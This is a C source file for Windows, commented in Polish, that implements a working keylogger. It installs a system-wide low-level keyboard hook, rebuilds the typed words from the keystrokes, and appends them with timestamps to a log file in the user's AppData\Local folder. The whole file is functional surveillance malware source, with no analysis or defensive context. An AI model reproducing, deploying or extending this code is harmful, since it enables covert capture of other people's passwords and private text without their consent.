#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <time.h>
#include <ctype.h>

HHOOK hKeyHook;
FILE *logFile;
char logPath[MAX_PATH];      // <- ścieżka do logu w AppData

// Bufor na słowa
char wordBuf[512];
int wordLen = 0;

// === Funkcje pomocnicze ===
void WriteWordToLog(const char *word) {
    if (!word || word[0] == '\0') return;

    time_t now = time(NULL);
    struct tm lt;
    localtime_s(&lt, &now);

    char ts[64];
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", &lt);

    fprintf(logFile, "[%s] %s\n", ts, word);
    fflush(logFile);
}

BOOL IsSeparator(DWORD vkCode) {
    switch (vkCode) {
        case VK_SPACE:
        case VK_RETURN:
        case VK_TAB:
        case VK_OEM_PERIOD: case VK_OEM_COMMA:
        case VK_OEM_1:  case VK_OEM_2:  case VK_OEM_7:
        case VK_OEM_4:  case VK_OEM_6:
            return TRUE;
        default:
            return FALSE;
    }
}

// Hook klawiatury
LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {
    if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN)) {
        KBDLLHOOKSTRUCT key = *((KBDLLHOOKSTRUCT*)lParam);
        DWORD vkCode = key.vkCode;

        // Backspace
        if (vkCode == VK_BACK) {
            if (wordLen > 0) wordLen--;
            wordBuf[wordLen] = '\0';
            return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
        }

        // Separator → zapisz słowo
        if (IsSeparator(vkCode)) {
            if (wordLen > 0) {
                wordBuf[wordLen] = '\0';
                WriteWordToLog(wordBuf);
                wordLen = 0;
                wordBuf[0] = '\0';
            }
            return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
        }

        // Konwersja vkCode na znak
        BYTE kbState[256];
        GetKeyboardState(kbState);
        WCHAR wChar[2];
        int res = ToUnicode(vkCode, key.scanCode, kbState, wChar, 2, 0);

        if (res == 1) {
            char ch;
            WideCharToMultiByte(CP_UTF8, 0, wChar, 1, &ch, 1, NULL, NULL);

            if (isprint((unsigned char)ch) && wordLen < sizeof(wordBuf) - 1) {
                wordBuf[wordLen++] = ch;
                wordBuf[wordLen] = '\0';
            }
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

// Thread hooka
DWORD WINAPI LoggerThread(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, hInstance, 0);

    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    return 0;
}

int main() {
    // Pobranie folderu AppData\Local aktualnego użytkownika
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, logPath))) {
        MessageBox(NULL, "Nie udało się pobrać folderu AppData!", "Błąd", MB_OK);
        return 1;
    }
    strcat(logPath, "\\my_keylog.txt");

    logFile = fopen(logPath, "a+");
    if (!logFile) {
        MessageBox(NULL, "Nie mogę otworzyć pliku logu!", "Błąd", MB_OK);
        return 1;
    }

    fprintf(logFile, "=== Start sesji ===\n");
    fflush(logFile);

    HANDLE thread = CreateThread(NULL, 0, LoggerThread, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);

    fclose(logFile);
    return 0;
}
